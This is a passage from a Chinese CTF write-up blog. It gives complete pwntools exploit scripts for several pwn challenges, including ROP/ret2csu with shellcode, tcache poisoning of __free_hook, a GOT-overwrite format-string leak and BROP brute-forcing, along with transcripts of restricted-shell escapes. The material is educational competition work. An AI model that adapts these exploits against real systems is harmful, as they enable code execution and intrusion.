range(1, 20): for j in range(13, 20): x = chr(ord('A') - 1 + j) x = x + str(i) p.sendline(x)for i in range(1, 9): p.sendline('L' + str(i))for i in range(12, 20): p.sendline('L' + str(i))for i in range(1, 8): p.sendline('K' + str(i))for i in range(13, 20): p.sendline('K' + str(i))for i in range(1, 8): p.sendline('J' + str(i))p.sendline('K9')p.sendline('K10')p.recv()p.interactive() Blue_Whale1234567891011121314$ docker pull n132/blue_whale:Blue_WhaleBlue_Whale: Pulling from n132/blue_whale7e6591854262: Pull complete089d60cb4e0a: Pull complete9c461696bc09: Pull complete45085432511a: Pull complete8aa06b945196: Pull completeDigest: sha256:8087896e15320744a841504f98936c90d29fbdb590a4940fdd0708a053570cabStatus: Downloaded newer image for n132/blue_whale:Blue_Whale$ docker run -it n132/blue_whale:Blue_Whale /bin/bashroot@46298885a759:/# find / -name &quot;fl4g&quot;/lib/x86_64-linux-gnu/fl4groot@46298885a759:/# cat /lib/x86_64-linux-gnu/fl4gZJGSUCTF&#123;0fbaed8d210a7a0480220a5c803d8435&#125; PwnMos1234567891011root@ed82d9634ea6:~/tmp# checksec ./main[*] &apos;/root/tmp/main&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segmentsroot@ed82d9634ea6:~/tmp# ./main123Magic Adress ===&gt;&gt;&gt;0x7ffd7ac7ab60 障眼法。。。最近好久题目做太少了完全没想到 shellcode，明明是一道送分题，心累。Exploit： 123456789101112131415161718192021222324252627282930#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'sp', '-h']context.arch = 'amd64'local = 0if local: p = process('./main')else: p = remote('10.21.13.190', 2600)# gdb.attach(p)main = 0x400566csu_end_addr = 0x40060acsu_front_addr = 0x4005f0buf = 0x00601000 + 0x100offset = 24payload = 'A' * offset + p64(csu_end_addr) + p64(0) + p64(1) + p64(read_got) + p64(0x400) + p64(buf) + p64(0) + p64(csu_front_addr) + '\\x00' * 56 + p64(buf)p.send(payload)payload = asm(''' mov rax, 59 mov rsi, 0 mov rdx, 0 mov rdi, 0x68732f6e69622f push rdi mov rdi, rsp syscall''')p.send(payload)p.interactive() Note简单tcache，填满tcache后利用unsorted bin泄漏libc，然后用tcache dup把__free_hook改成system。Exploit： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'sp', '-h']local = 0if local: p = process('./note')else: p = remote('10.21.13.190', 2599)libc = ELF('./libc-2.27.so')one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]# gdb.attach(p)def cmd(c): p.recvuntil('========\\n\\n') p.sendline(str(c))def add(content): cmd(1) p.recvuntil('Note&gt;\\n') p.send(content)def delete(idx): cmd(2) p.recvuntil('&gt;') p.sendline(str(idx))def show(idx): cmd(3) p.recvuntil('&gt;') p.sendline(str(idx))add('A') # 0add('B') # 1add('A') # 2add('A') # 3add('A') # 4add('A') # 5add('A') # 6add('A') # 7add('A') # 8delete(2)delete(3)delete(4)delete(5)delete(6)delete(7)delete(8)delete(0)show(0)offset = 0x7f6d1974dca0-0x7f6d19362000libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - offsetsuccess('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget[2]success('one_gadget = ' + hex(one_gadget))add('A') # 0add('A') # 2add('A') # 3add('A') # 4add('A') # 5add('A') # 6add('A') # 7add('A') # 8delete(8)delete(8)free_hook = libc_base + libc.symbols['__free_hook']add(p64(free_hook)) # 8add('A') # 9system = libc_base + libc.symbols['system']success('system = ' + hex(system))add(p64(system)) # 10# gdb.attach(p)add('/bin/sh') # 11delete(20)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2019-Starctf-blindpwn","slug":"2019-Starctf-blindpwn","date":"2019-05-01T13:41:36.000Z","updated":"2019-08-26T01:16:21.890Z","comments":true,"path":"2019/05/01/2019-Starctf-blindpwn/","link":"","permalink":"blog.b3ale.cn/2019/05/01/2019-Starctf-blindpwn/","excerpt":"第一次盲打 pwn。","text":"第一次盲打 pwn。 Description12345678910111213141516Close your eyes!$ nc 34.92.37.22 10000checksec:Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)file libc:libc-2.23.so: ELF 64-bit LSB shared object,x86-64, version 1 (GNU/Linux), dynamicallylinked, interpreter /lib64/ld-linux-x86-64.so.2,BuildID[sha1]=b5381a457906d279073822a5ceb2 Analysis试了一下格式化字符串无果，猜测是栈溢出。尝试爆破溢出的长度，检测脚本： 12345678910def find_offset(): for i in range(1, 500): try: p = remote('34.92.37.22', 10000) p.sendafter('!\\n', 'A' * i) p.recv() p.close() except EOFError: success('Founded! offset = ' + hex(i - 1)) break 判断出溢出的偏移之后，接下来就是要找 gadget。先尝试自己编译一个类似的程序（gcc test.c -o test -fno-stack-protector）： 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void vul() &#123; char buf[0x20]; puts(\"Welcome!\"); read(0, buf, 0x100); puts(\"Goodbye!\");&#125;int main() &#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); vul();&#125; 用objdump看反汇编基本可以知道.text段是从0x400500开始，到将近0x400800结束。我们要的通用 gadget 在__libc_csu_init中，就直接尝试从0x400600开始爆破： 12345678910111213141516171819def get_stop_gadget(offset): stop_gadget = 0x400000 + 0x600 stop_gadget_list = [] while True: if stop_gadget &gt; 0x400800: return stop_gadget_list try: p = remote('34.92.37.22', 10000) payload = 'A' * offset + p64(stop_gadget) p.sendafter('pwn!\\n', payload) p.recv() p.close() success('Founded! stop_gadget = ' + hex(stop_gadget)) stop_gadget_list.append(stop_gadget) stop_gadget = stop_gadget + 1 except Exception: stop_gadget = stop_gadget + 1 p.close()# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x4006f1, 0x4006f6, 0x400705, 0x40070a, 0x40070f, 0x400714, 0x400776] 拿到了一堆地址，跟据返回地址可以判断第一个肯定是函数开始的地址。后面的应该都是函数中的地址。在一个地址可以看到很多奇怪的输出： 1234567891011121314151617181920212223242526272829[DEBUG] Received 0x1b bytes: &apos;Welcome to this blind pwn!\\n&apos;[DEBUG] Sent 0x30 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ * 00000020 41 41 41 41 41 41 41 41 ec 06 40 00 00 00 00 00 │AAAA│AAAA│··@·│····│ 00000030[*] Switching to interactive mode[DEBUG] Received 0x100 bytes: 00000000 57 65 6c 63 6f 6d 65 20 74 6f 20 74 68 69 73 20 │Welc│ome │to t│his │ 00000010 62 6c 69 6e 64 20 70 77 6e 21 0a 00 47 6f 6f 64 │blin│d pw│n!··│Good│ 00000020 62 79 65 21 0a 00 00 00 01 1b 03 3b 40 00 00 00 │bye!│····│···;│@···│ 00000030 07 00 00 00 44 fd ff ff 8c 00 00 00 a4 fd ff ff │····│D···│····│····│ 00000040 5c 00 00 00 9a fe ff ff b4 00 00 00 bf fe ff ff │\\···│····│····│····│ 00000050 d4 00 00 00 02 ff ff ff f4 00 00 00 54 ff ff ff │····│····│····│T···│ 00000060 14 01 00 00 c4 ff ff ff 5c 01 00 00 14 00 00 00 │····│····│\\···│····│ 00000070 00 00 00 00 01 7a 52 00 01 78 10 01 1b 0c 07 08 │····│·zR·│·x··│····│ 00000080 90 01 07 10 14 00 00 00 1c 00 00 00 40 fd ff ff │····│····│····│@···│ 00000090 2a 00 00 00 00 00 00 00 00 00 00 00 14 00 00 00 │*···│····│····│····│ 000000a0 00 00 00 00 01 7a 52 00 01 78 10 01 1b 0c 07 08 │····│·zR·│·x··│····│ 000000b0 90 01 00 00 24 00 00 00 1c 00 00 00 b0 fc ff ff │····│$···│····│····│ 000000c0 50 00 00 00 00 0e 10 46 0e 18 4a 0f 0b 77 08 80 │P···│···F│··J·│·w··│ 000000d0 00 3f 1a 3b 2a 33 24 22 00 00 00 00 1c 00 00 00 │·?·;│*3$&quot;│····│····│ 000000e0 44 00 00 00 de fd ff ff 25 00 00 00 00 41 0e 10 │D···│····│%···│·A··│ 000000f0 86 02 43 0d 06 60 0c 07 08 00 00 00 1c 00 00 00 │··C·│·`··│····│····│ 00000100Welcome to this blind pwn!\\x00Goodbye!\\x00\\x00\\x00\\x1b\\x03;@\\x00\\x00\\x00\\x07\\x00\\x00\\x00D????\\x00\\xa4???\\\\x00\\x9a\\xfe\\xff\\xff\\xb4\\x00\\x00\\x00\\xbf\\xfe\\xff\\xff?\\x00\\x00\\xff\\xff\\xff?T\\xff\\xff\\xff\\x14\\x00\\x00??\\xff\\xff\\\\x00\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00zR\\x00x\\x10\\x1b\\x0c\\x0\\x90\\x07\\x10\\x14\\x00\\x00\\x00\\x1c\\x00\\x00\\x00@???*\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00zR\\x00x\\x10\\x1b\\x0c\\x0\\x90\\x00\\x00$\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\xb0???P\\x00\\x00\\x0e\\x10F\\x0e\\x18J\\x0f\\x0b\\x80\\x00?\\x1a;*3$&quot;\\x00\\x00\\x00\\x00\\x1c\\x00\\x00\\x00D\\x00\\x00\\x00??\\xff\\xff%\\x00\\x00\\x00\\x00A\\x0e\\x10\\x86C\\x06`\\x0c\\x0\\x00\\x00\\x00\\x1c\\x00\\x00\\x00$ 发生了这种情况，基本可以排除输出函数是puts还有printf的可能了，因为只有可能是write在参数发生错误的时候会输出不一样长度的内容（后来出题人说是因为忘记清空寄存器了）。这里也出现了一个非预期解，因为这个地方直接泄漏了 libc 上的值。放一下 exp： 1234567891011121314p = remote('34.92.37.22', 10000)payload = 'A' * offset + p64(stop_gadget_list[7])p.recvuntil('!\\n')p.sendline(payload)libc_start_main = u64(p.recv()[0x48:0x48+8].ljust(8, '\\x00')) - 240success('libc_start_main = ' + hex(libc_start_main))libc_base = libc_start_main - 0x20740success('libc_base = ' + hex(libc_base))one_gadget_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + one_gadget_offset[0]success('one_gadget = ' + hex(one_gadget))payload = 'A' * offset + p64(one_gadget)p.sendline(payload)p.interactive() 下面还是记录一般 brop 中 dump 内存的方法。 基本判断出是write了之后，可以再定位一下call write的地址，手工枚举一下附近的几个地址： 123456789$ python -c &quot;import sys; sys.stdout.write(&apos;a&apos;*0x28+&apos;\\x14\\x07\\x40&apos;)&quot; | nc 34.92.37.22 10000 # # #### ##### ###### # # # # # #### ### # # ##### # # # # # # # # # # # #### # #Welcome to this blind pwn!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@F1? @0?;?F1????;?@|??V??p@F1?|??Z???&#125;|???^&#125;(F1?h??;?ۇ?;?p@F1?% 看到直接把我们输入的字符串以及后面的一些东西输出来了，那说明没有传参直接 call 了write。 接下来我们最需要的是在__libc_csu_init中的 gadgets，想办法爆破出这个地址： 12345678910111213141516171819def get_brop_gadget(offset, stop_gadget): brop_gadget = 0x400600 brop_gadget_list = [] while True: if brop_gadget &gt; 0x400800: return brop_gadget_list p = remote('34.92.37.22', 10000) payload = 'A' * offset + p64(brop_gadget) + p64(0) * 6 + p64(stop_gadget) p.sendafter('pwn!\\n', payload) try: p.recvuntil('pwn!\\n') except: p.close() else: success('Founded!' + hex(brop_gadget)) brop_gadget_list.append(brop_gadget) p.close() brop_gadget = brop_gadget + 1# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x400776] 最后一个地址显然和之前不一样，可以判断出是__libc_csu_init上的 gadgets。然后根据偏移可以得到几条关键指令的地址，也就得到了我们的通用 gadgets： 1234567891011121314151617.text:0000000000400700 mov rdx, r13.text:0000000000400703 mov rsi, r14.text:0000000000400706 mov edi, r15d.text:0000000000400709 call qword ptr [r12+rbx*8].text:000000000040070D add rbx, 1.text:0000000000400711 cmp rbx, rbp.text:0000000000400714 jnz short loc_400700.text:0000000000400716.text:0000000000400716 loc_400716: ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400716 add rsp, 8.text:000000000040071A pop rbx.text:000000000040071B pop rbp.text:000000000040071C pop r12.text:000000000040071E pop r13.text:0000000000400720 pop r14.text:0000000000400722 pop r15.text:0000000000400724 retn 拿到了通用 gadget，同时利用前面得到的call write，我们可以把整个 binary 直接 dump 下来： 1234567891011def leak(start, length): elf = '' for i in range((length + 0xff) / 0x100): p = remote('34.92.37.22', 10000) payload = ('A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(start + i * 0x100) + p64(0) + p64(call_write)).ljust(0x80, 'A') print repr(payload) print len(payload) p.sendafter('pwn!\\n', payload) elf += p.recv(0x100) p.close() return elf 拿到程序之后，在 ida 里可以查到write的plt和got，接下来就是泄漏然后get shell了。： 1234LOAD:0000000000400520 sub_400520 proc near ; CODE XREF: sub_4006CE+28↓pLOAD:0000000000400520 ; sub_4006CE+46↓pLOAD:0000000000400520 jmp cs:qword_601018LOAD:0000000000400520 sub_400520 endp Exploit12345678910111213141516# start attackp = remote('34.92.37.22', 10000)write_plt = 0x400520write_got = 0x601018payload = 'A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main)p.sendafter('pwn!\\n', payload)write = u64(p.recvuntil('\\x7f').ljust(8, '\\x00'))success('write = ' + hex(write))libc_base = write - 0x0f72b0success('libc_base = ' + hex(libc_base))# get shellsystem = libc_base + 0x045390str_bin_sh = libc_base + 0x18cd57payload = 'A' * offset + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)p.sendafter('pwn!\\n', payload)p.interactive() Referenceshttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#_12https://n132.github.io/2019/04/29/2019-04-29-Starctf2019-Blindpwn/http://shift-crops.hatenablog.com/entry/2019/04/30/131154#blindpwn-Pwn-303pt-47-solveshttps://balsn.tw/ctf_writeup/20190427-*ctf/#blindpwnhttps://github.com/sixstars/starctf2019/blob/master/pwn-blindpwn","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"2019-Starctf-quicksort","slug":"2019-Starctf-quicksort","date":"2019-04-29T10:15:42.000Z","updated":"2019-08-26T01:16:16.019Z","comments":true,"path":"2019/04/29/2019-Starctf-quicksort/","link":"","permalink":"blog.b3ale.cn/2019/04/29/2019-Starctf-quicksort/","excerpt":"略有点脑洞的 Got hijack。","text":"略有点脑洞的 Got hijack。 记录一下国际大赛上做出的第一道 pwn 题。 Checksec1234567root@aa922ef5677a:~/tmp# checksec ./quicksort[*] '/root/tmp/quicksort' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Analysis1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162unsigned int func()&#123; char *num; // ebx char s; // [esp+Ch] [ebp-2Ch] char v3; // [esp+Dh] [ebp-2Bh] char v4; // [esp+Eh] [ebp-2Ah] char v5; // [esp+Fh] [ebp-29h] char v6; // [esp+10h] [ebp-28h] char v7; // [esp+11h] [ebp-27h] char v8; // [esp+12h] [ebp-26h] char v9; // [esp+13h] [ebp-25h] char v10; // [esp+14h] [ebp-24h] char v11; // [esp+15h] [ebp-23h] char v12; // [esp+16h] [ebp-22h] char v13; // [esp+17h] [ebp-21h] char v14; // [esp+18h] [ebp-20h] char v15; // [esp+19h] [ebp-1Fh] char v16; // [esp+1Ah] [ebp-1Eh] char v17; // [esp+1Bh] [ebp-1Dh] int sum; // [esp+1Ch] [ebp-1Ch] int i; // [esp+20h] [ebp-18h] int j; // [esp+24h] [ebp-14h] char *ptr; // [esp+28h] [ebp-10h] unsigned int v22; // [esp+2Ch] [ebp-Ch] v22 = __readgsdword(0x14u); v3 = 0; v4 = 0; v5 = 0; v6 = 0; v7 = 0; v8 = 0; v9 = 0; v10 = 0; v11 = 0; v12 = 0; v13 = 0; v14 = 0; v15 = 0; v16 = 0; v17 = 0; s = 0; sum = 0; puts(\"how many numbers do you want to sort?\"); __isoc99_scanf(\"%d\", &amp;sum); getchar(); ptr = (char *)malloc(4 * sum); for ( i = 0; i &lt; sum; ++i ) &#123; printf(\"the %dth number:\", i + 1); gets(&amp;s); num = &amp;ptr[4 * i]; *(_DWORD *)num = atoi(&amp;s); &#125; quicksort((int)ptr, 0, sum - 1); puts(\"Here is the result:\"); for ( j = 0; j &lt; sum; ++j ) printf(\"%d \", *(_DWORD *)&amp;ptr[4 * j]); puts(&amp;byte_8048AD2); free(ptr); return __readgsdword(0x14u) ^ v22;&#125; 程序要求输入一个数字 sum，然后再输入 sum 个数字，最后对这些数字快排之后得到结果。 这里漏洞很明显是有一个gets，然而显然做不到直接 rop。在调试一段时间之后，发现了一个任意地址写的地方： 123456789101112131415161718192021assassinq&gt;&gt; stack 200000| 0xffe85300 --&gt; 0xffe8531c --&gt; 0x00004| 0xffe85304 --&gt; 0x10008| 0xffe85308 --&gt; 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00012| 0xffe8530c --&gt; 0x80488c5 (mov eax,DWORD PTR [ebp-0x1c])0016| 0xffe85310 --&gt; 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00020| 0xffe85314 --&gt; 0xf77b8010 (&lt;_dl_runtime_resolve+16&gt;: pop edx)0024| 0xffe85318 --&gt; 0xf7782864 --&gt; 0x00028| 0xffe8531c --&gt; 0x00032| 0xffe85320 --&gt; 0x00036| 0xffe85324 --&gt; 0x00040| 0xffe85328 --&gt; 0x00044| 0xffe8532c --&gt; 0x20048| 0xffe85330 --&gt; 0x00052| 0xffe85334 --&gt; 0x00056| 0xffe85338 --&gt; 0x83d0008 --&gt; 0x00060| 0xffe8533c --&gt; 0x9838e2000064| 0xffe85340 --&gt; 0x10068| 0xffe85344 --&gt; 0x00072| 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00076| 0xffe8534c --&gt; 0x80489e4 (mov eax,0x0) 在读取数字的gets这里停下，查看栈的情况。这里的0x83d0008是程序中的ptr，然后程序会将我们输入的字符串atoi之后，赋给ptr指向的地址。在中间还有一个地址存放剩余循环的次数。我们可以通过缓冲区溢出，一开始的数字为我们想要修改的内容，中间存放剩余循环次数，最后放我们要写的地址，就达到了任意地址写的目的。而canary又在下面，不会受到影响。 接下来就需要想办法泄漏，n132 学长提供了一个思路就是改成printf之后直接 format string。最后的思路是把free改成了printf，然后泄漏 libc 上的地址。这里要注意的一点就是atoi返回的值是signed int，如果字符串超过了四个字符，那就会返回0x7fffffff，所以泄漏的时候找了第六个参数，%6$p就不会超过signed int。 10056| 0xff8348f8 --&gt; 0x804a800 --&gt; 0x7fffffff free完之后还需要写one_gadget，所以这里想办法再跳回到func。想要绕过canary肯定是不可能了，所以前面也利用了一次任意写，把__stack_chk_fail改成了func，这样又能跳回来。 最后写one_gadget的时候又遇到了上面signed int的问题，这个无法避免了。想到的一个骚思路是用补码，传一个负数进去，就能写上one_gadget了。 Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.arch = 'i386'context.terminal = ['tmux', 'sp', '-h']local = 0if local: p = process('./quicksort') libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('34.92.96.238', 10000) libc = ELF('./libc.so.6')elf = ELF('./quicksort')g = lambda x: next(elf.search(asm(x)))gets_plt = elf.plt['gets']gets_got = elf.got['gets']puts_plt = elf.plt['puts'] # 0x8048560puts_got = elf.got['puts'] # 0x804a02cfree_got = elf.got['free'] # 0x804a018atoi_got = elf.got['atoi']printf_got = elf.got['printf']printf_plt = elf.plt['printf']func = 0x08048816buf = 0x0804a000 + 0x800 # 0x0804b000 - 0x100stack_chk_fail_got = elf.got['__stack_chk_fail']#gdb.attach(p, '''#b *0x80489aa#''')def write(addr, val, t): payload = str(val) payload += (0x10 - len(payload)) * '\\x00' payload += p32(t) payload += (0x1C - len(payload)) * '\\x00' payload += p32(addr) p.recvuntil('number:') p.sendline(payload)def overflow(addr, val, t): payload = str(val) payload += (0x10 - len(payload)) * '\\x00' payload += p32(t) payload += (0x1C - len(payload)) * '\\x00' payload += p32(addr) + '\\x00' * 4 p.recvuntil('number:') p.sendline(payload)t = 2p.recvuntil('sort?\\n')p.sendline(str(t))write(free_got, printf_plt, 2)write(stack_chk_fail_got, func, 2)fmt = '%6$p'overflow(buf, str(int(fmt[::-1].encode('hex'), 16)), 1)p.recvuntil('0x')libc_base = int(p.recv(8), 16) - 0x1b3864success('libc_base = ' + hex(libc_base))one_gadget = libc_base + 0x3ac62success('one_gadget = ' + hex(one_gadget))one_gadget_complement = -(0x100000000 - one_gadget)success('one_gadget_complement = ' + hex(one_gadget_complement))p.recvuntil('sort?\\n')p.sendline(str(t))overflow(stack_chk_fail_got, one_gadget_complement, 1)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"Some Linux Category Challenges","slug":"Some-Linux-Category-Challenges","date":"2019-04-15T09:05:27.000Z","updated":"2019-08-26T05:51:07.050Z","comments":true,"path":"2019/04/15/Some-Linux-Category-Challenges/","link":"","permalink":"blog.b3ale.cn/2019/04/15/Some-Linux-Category-Challenges/","excerpt":"在 Byte Bandits CTF 2019 和 WPICTF 2019 中又遇到了 Linux 题，记录记录。","text":"在 Byte Bandits CTF 2019 和 WPICTF 2019 中又遇到了 Linux 题，记录记录。 Byte Bandits CTF 2019bash-fu123456789$ nc 13.234.130.76 7002bash: cannot set terminal process group (1): Not a ttybash: no job control in this shellbash-4.4$ lslsbash: LS: command not foundbash-4.4$ pwdpwdbash: PWD: command not found 显然 bash 是区分大小写的，而后台有一个程序把我们输入的命令改成了大写字母。谷歌一下可以找到shell 如何将 \b 字母进行大小写转换。然后定义一下变量，执行${l,,}就能执行小写的命令了。 12345678910111213141516bash-4.4$ l=\"ls /\"l=\"ls /\"bash-4.4$ $&#123;l,,&#125;$&#123;l,,&#125;bin etc jail media opt root sbin sys usrdev home lib mnt proc run srv tmp varbash-4.4$ l=\"ls /jail/\"l=\"ls /jail/\"bash-4.4$ $&#123;l,,&#125;$&#123;l,,&#125;flag.txt jailbash-4.4$ c=\"cat /jail/flag.txt\"c=\"cat /jail/flag.txt\"bash-4.4$ $&#123;c,,&#125;$&#123;c,,&#125;flag&#123;b@$h_jails_are_3asy_p3@sy&#125; 看一下jail，主要就是把小写字母替换成了大写： 123456789101112131415161718bash-4.4$ cat jailcat jailpreexec () &#123; filtered=$(echo $BASH_COMMAND | tr '[:lower:]' '[:upper:]') eval $filtered&#125;preexec_invoke_exec () &#123; [ -n \"$COMP_LINE\" ] &amp;&amp; return # do nothing if completing [ \"$BASH_COMMAND\" = \"$PROMPT_COMMAND\" ] &amp;&amp; return # don't cause a preexec for $PROMPT_COMMAND [ \"$BASH_COMMAND\" = \"shopt -s extdebug\" ] &amp;&amp; return preexec return 1&#125;shopt -s extdebugset -o noglobtrap 'preexec_invoke_exec' DEBUG &amp;&amp; shopt -s extdebug# vim:ft=sh 还看到另外有一种做法是，用$0： 12345678910111213bash-4.4$ $0$0bash: cannot set terminal process group (1): Not a ttybash: no job control in this shellbash: /root/.bashrc: Permission deniedbash-4.4$ cd /jailcd /jailbash-4.4$ lslsflag.txt jailbash-4.4$ cat flag.txtcat flag.txtflag&#123;b@$h_jails_are_3asy_p3@sy&#125; 测试了一下发现$0表示当前使用的 shell： 12345root@152486b98e3d:~# echo $0/bin/bashroot@152486b98e3d:~# $0root@152486b98e3d:~# exitroot@152486b98e3d:~# WPICTF 2019suckmore-shell1234567891011$ ssh ctf@107.21.60.114ctf@107.21.60.114's password:SuckMORE shell v1.0.1. Note: for POSIX support update to v1.1.0suckmore&gt;lssuckmore&gt;ls -hsleep: invalid option -- 'h'Try 'sleep --help' for more information.suckmore&gt;dirbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsuckmore&gt;cd homecal: failed to parse timestamp or unknown month name: home ls被alias成了sleep，cd也变成了cal，可以用dir来代替ls。尝试用$0无果： 1234suckmore&gt;$0SuckMORE shell v1.0.1. Note: for POSIX support update to v1.1.0suckmore&gt;shWhy would you ever want to leave suckmore shell? 这里用exec来换 shell： 123456789101112131415suckmore&gt;exec /bin/shsuckmore&gt;lssh: /usr/bin/ls: Permission deniedsuckmore&gt;dirbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsuckmore&gt;cd homesuckmore&gt;dirctfsuckmore&gt;cd ctfsuckmore&gt;dirflagsuckmore&gt;cat flagsh: /usr/bin/cat: Permission deniedsuckmore&gt;sed '' flagWPI&#123;bash_sucks0194342&#125; pseudo-random1234567891011121314151617181920$ ssh ctf@prand.wpictf.xyzctf@prand.wpictf.xyz's password:sh-4.4$ lsbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsh-4.4$ cd homesh-4.4$ lsctfsh-4.4$ cd ctfsh-4.4$ lssh-4.4$ ls -a. .. .bash_logout .bash_profile .bashrcsh-4.4$ cd /sh-4.4$ lsbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsh-4.4$ cd devsh-4.4$ lsconsole core fd full mqueue null ptmx pts random shm stderr stdin stdout tty urandom zerosh-4.4$ file *randomrandom: openssl enc'd data with salted passwordurandom: ASCII text 根据题目的提示，在 dev 目录下找到了一个不寻常的文件。通过openssl解密aes-256-cbc，指定解密文件为random，指定口令存放文件为urandom： 123456sh-4.4$ openssl enc -d -aes-256-cbc -in random -kfile urandom*** WARNING : deprecated key derivation used.Using -iter or -pbkdf2 would be better.Being holy in our church means installing a wholly free operating system--GNU/Linux is a good choice--and not putting any non-free software on your computer. Join the Church of Emacs, and you too can be a saint!And lo, it came to pass, that the neophyte encountered the Beplattered One and humbly posed the question \"Oh great master, is it a sin to use vi?\" And St. IGNUcuis dist thus reply unto him, \"No, my young hacker friend, it is not a sin. It is a penance.\"WPI&#123;@11_Ur_d3v1c3s_r_b3l0ng_2_us&#125; crond123456789101112$ ssh ctf@crond.wpictf.xyzctf@crond.wpictf.xyz's password:sh-4.4$ lsbin boot dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr varsh-4.4$ cd homesh-4.4$ lsctfsh-4.4$ cd ctfsh-4.4$ lssh-4.4$ ls -a. .. .bash_logout .bash_profile .bashrcsh-4.4$ cd / 找了一圈没什么收获，尝试看看进程下有什么特殊的地方： 1234567891011121314151617181920sh-4.4$ pssh: ps: command not foundsh-4.4$ ls /proc1 acpi cpuinfo execdomains ioports kmsg mdstat net self sysrq-trigger version10 buddyinfo crypto fb irq kpagecgroup meminfo pagetypeinfo slabinfo sysvipc version_signature11 bus devices filesystems kallsyms kpagecount misc partitions softirqs thread-self vmallocinfo320 cgroups diskstats fs kcore kpageflags modules sched_debug stat timer_list vmstat321 cmdline dma interrupts key-users loadavg mounts schedstat swaps tty xen8 consoles driver iomem keys locks mtrr scsi sys uptime zoneinfosh-4.4$ cd procsh-4.4$ for i in `ls */cmdline`; do cat -A $i; echo &apos;&apos;; done/bin/bash^@/bin/init_d^@su^@ctf^@sh^@sleep^@1^@cat: 1482/cmdline: No such file or directory/bin/bash^@/usr/bin/fakecron^@cat^@-A^@self/cmdline^@cat^@-A^@thread-self/cmdline^@ 尝试把每个进程的cmdline读出来，发现了跑着一个叫/usr/bin/fakcron的东西。cron是运用 Linux 所不可缺少的工具，可用来定期的管理获取日志的软件，定期的检查系统状态，可用来监视进程或者其它主机是否正常运行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778sh-4.4$ sed '' /usr/bin/fakecron#!/bin/bash# Cron. But worse.## Copyright (c) 2019, SuckMore Software, a division of WPI Digital Holdings Ltd.# Redistribution and use in source and binary forms, with or without# modification, are permitted provided that the following conditions are met:# 1. Redistributions of source code must retain the above copyrig# notice, this list of conditions and the following disclaimer.# 2. Redistributions in binary form must reproduce the above copyright# notice, this list of conditions and the following disclaimer in the# documentation and/or other materials provided with the distribution.# 3. All advertising materials mentioning features or use of this software# must display the following acknowledgement:# This product includes software developed by SuckMore Software, a division# of WPI Digital Holdings Ltd.# 4. Neither the name of the SuckMore Software, a division of WPI Digital Holdings# Ltd, nor the names of its contributors may be used to endorse or promote# products derived from this software without specific prior written permission.## THIS SOFTWARE IS PROVIDED BY SuckMore Software, a division of# WPI Digital Holdings Ltd., ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND# FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL# SuckMore Software, a division of WPI Digital Holdings Ltd.# DIRECT, 